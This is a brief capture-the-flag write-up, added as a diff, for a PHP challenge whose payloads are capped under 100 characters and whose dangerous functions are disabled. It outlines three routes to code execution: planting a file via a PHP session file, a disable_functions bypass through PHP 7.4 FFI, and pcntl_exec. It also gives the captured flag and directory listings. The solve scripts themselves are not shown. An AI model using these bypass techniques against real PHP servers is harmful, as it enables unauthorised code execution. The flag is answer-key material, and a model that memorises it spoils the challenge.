@@ -1,0 +1,68 @@
+Payload length < 100
+disable_functions => hard to write something interesting with php
+
+python3 phpinfo.py
+	phpinfo_output
+
+PHP Version => 7.4.3
+
+================ Solution 1 ================
+
+Write python file in php session file /tmp/l3opy
+
+python3 solve.py OR python3 official.py
+
+ls /
+```
+El_FlAAG___FilEE
+app
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+```
+
+cat /*
+```
+3k{JuSt_A_WaRmUp_O.o}
+```
+
+================ Solution 2 ================
+
+PHP 7.4 disable_functions bypass with FFI (Foreign Function Interface)
+
+python solve.py
+
+```
+>> cat /El_FlAAG___FilEE
+[*] Exploitation
+[*] filename : zjeodm.php
+[*] result : 3k{JuSt_A_WaRmUp_O.o}
+```
+
+================ Solution 3 ================
+
+Use pcntl_exec to do RCE
+
+python3 solve.py
+
+```
+3k{JuSt_A_WaRmUp_O.o}
+```
